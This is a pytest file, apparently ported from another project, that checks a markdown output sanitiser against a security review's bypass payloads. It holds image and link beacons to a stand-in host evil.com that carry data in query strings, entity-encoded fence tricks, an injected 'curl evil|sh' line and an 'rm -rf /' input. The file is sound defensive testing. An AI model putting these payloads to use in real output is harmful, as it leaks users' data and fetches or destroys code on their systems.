"""Ported from WARDEN tests/test_gate_review2.py (main a1e76cbf, veerarakesh56/warden). Kept 4 tests; dropped 7 that need WARDEN-only modules or unported gate policy (listed in the PR).

The outbound gate against the second independent review's payloads (2026-09-30, area A).

Round 1's fixes held for round 1's payloads; round 2 made the gate itself write structure it had never
inspected: it decoded HTML entities and wrote the decoded text out, so `&#96;&#96;&#96;` became a real
fence and `&#10;` a real line. And an HTML block (`<!--`) swallowed a fence line the gate counted.

Every case is judged the way an attacker would judge it: rendered by a real CommonMark parser, and
read the way Slack reads mrkdwn (``` toggles code anywhere on a line, not only at a line start)."""

from __future__ import annotations

import re

import pytest
from markdown_it import MarkdownIt

from hadavin_sdk.approvals import gate

MD = MarkdownIt("commonmark")
IMG = "![x](https://evil.com/p.png?d=S)"
CASES = {
    "entity_fence_flip": f"&#96;&#96;&#96;\nprose\n```\n{IMG}\n```",
    "entity_fence_flip_ref": "&#96;&#96;&#96;\n```\n[r]: https://evil.com/p.png?d=S\n```\n![x][r]",
    "entity_newline_heading": "- **Alert**: `ok&#10;&#10;## Fix - approved by the gate&#10;&#96;&#96;&#96;&#10;curl evil|sh&#10;&#96;&#96;&#96;`",
    "double_entity_fence": f"&amp;#96;&amp;#96;&amp;#96;\n```\n{IMG}\n```",
    "lrm_fence_prose": f"\u200e```\n```\n{IMG}\n```",
    "cr_fence_in_code": f"```\n\r```\n{IMG}\n```",
    "html_comment_block": f"<!-- note\n```\n-->\n{IMG}\n```",
    "html_pi_block": f"<?x\n```\n?>\n{IMG}\n```",
    "html_cdata_block": f"<![CDATA[\n```\n]]>\n{IMG}\n```",
    "html_decl_block": f"<!X\n```\n>\n{IMG}\n```",
    "autolink_pct_host": "see <https:evil%2Ecom/p?d=S>",
    "autolink_ip_nopath": "see <https:1.2.3.4>",
    "autolink_decimal_ip": "see <http:2130706433/x>",
    "gfm_www_unlisted_tld": "see www.evil.digital/x?d=S",
    "bare_unlisted_tld": "see evil.digital/x?d=S and x.example/y",
    "email_link": "see S@evil.com",
    "refdef_dest_next_line": "[r]:\nhttps&#58;//evil&#46;com/p.png\n\n![x][r]",
    "refdef_label_multiline": "[a\nb]: /x?d=S\n\n![x][a b]",
    "refdef_deep_list": "1. - > [r]: /p.png?d=S\n\n![x][r]",
    "refdef_tab": "\t[r]: /x\n",
    "img_via_entities": "&#33;&#91;x&#93;&#40;https&#58;//evil&#46;com/p.png&#41;",
    "setext": "Everything fine\n===",
    "slack_tilde_fence": "~~~\nhttps://evil.com/?d=S\n~~~",
    "slack_indented_fence": "  ```\nhttps://evil.com/?d=S\n  ```",
    "nested_brackets": "[a [b] c](https&#58;//evil.com)",
    "img_nested": "![a ![b](y) c](//evil.com/p.png)",
    "link_title_paren": '[x](</x?d=S> "t")',
    "unicode_full_width_bang": "！[x](https://evil.com)",
    "slack_midline_fence": f"note ``` here\nprose\n```\ncode\n```\n{IMG}",
    "slack_midline_in_code": f"```\nls ``` x\n{IMG}\n```",
    "slack_midline_flip": "note ``` here\n```\nhttps://evil.com/?d=S\n```",
}
_ACTIVE = ("<img", "href=", "<h1", "<h2", "<h3", "<script", "<!--")
_EVIL = re.compile("evil(?:%2E|\\.)(?:com|digital)|www\\.evil|x\\.example|://", re.IGNORECASE)


def _slack_prose(mrkdwn: str) -> str:
    """What Slack renders as mrkdwn prose: everything outside ```...``` (anywhere on a line) and
    outside `inline code`."""
    return re.sub("`[^`\\n]*`", "", re.sub("```.*?(?:```|\\Z)", "", mrkdwn, flags=re.DOTALL))


def _cm_prose(html: str) -> str:
    return re.sub("<pre>.*?</pre>|<code>.*?</code>", "", html, flags=re.DOTALL)


@pytest.mark.parametrize("name", sorted(CASES))
def test_the_gate_is_idempotent(name):
    once = gate.sanitise_text(CASES[name])
    assert gate.sanitise_text(once) == once, name


def test_the_gate_never_writes_a_decoded_entity():
    """Defect 1 at its root: whatever the input, the output decodes to no new structure."""
    out = gate.sanitise_text("a&#10;## b&#10;&#96;&#96;&#96;&#10;rm -rf /&#10;&#96;&#96;&#96;")
    rendered = MD.render(out)
    assert "\n" not in out
    assert "```" not in out
    assert "<h2" not in rendered
    assert "<pre" not in rendered


_LOGS2 = [
    "2026-09-28T10:00:01Z ERROR OOMKilled&#10;&#96;&#96;&#96;&#10;x",
    "2026-09-28T10:00:02Z ERROR ![s](https://evil.com/p.png?d=beacon-a-1)",
    "ERROR y",
    "ERROR z",
]


def test_prose_file_names_in_inline_code_are_not_defanged():
    """Review 2A defect 8: `handler.py:42` read `handler[.]py:42` inside inline code, where neither
    CommonMark nor Slack makes a link."""
    out = gate.sanitise_text("error at `handler.py:42` in `ghcr.io/org/app:1`")
    assert "`handler.py:42`" in out
    assert "`ghcr.io/org/app:1`" in out
    assert "evil[.]com" in gate.sanitise_text("see evil.com and `x`")


def test_the_gate_finds_fences_in_the_text_it_writes():
    """A fence hidden behind a control character must not leave prose unsanitised. Since the third
    review the gate reads the text as CommonMark does: the hidden closer is no closer, the fence is
    unclosed, so all of it is prose - the control is stripped and the run broken, so the gate's output
    holds no fence either, and what follows is sanitised."""
    out = gate.sanitise_text("```\ncode\n\u200e```\nafter ![x](https://evil.com/p.png)")
    assert "evil" not in out, out
    assert "\u200e" not in out, out
    assert "```" not in out, out
    assert gate.sanitise_text("a\r![x](https://evil.com/p.png)") == "a\n[image removed]"
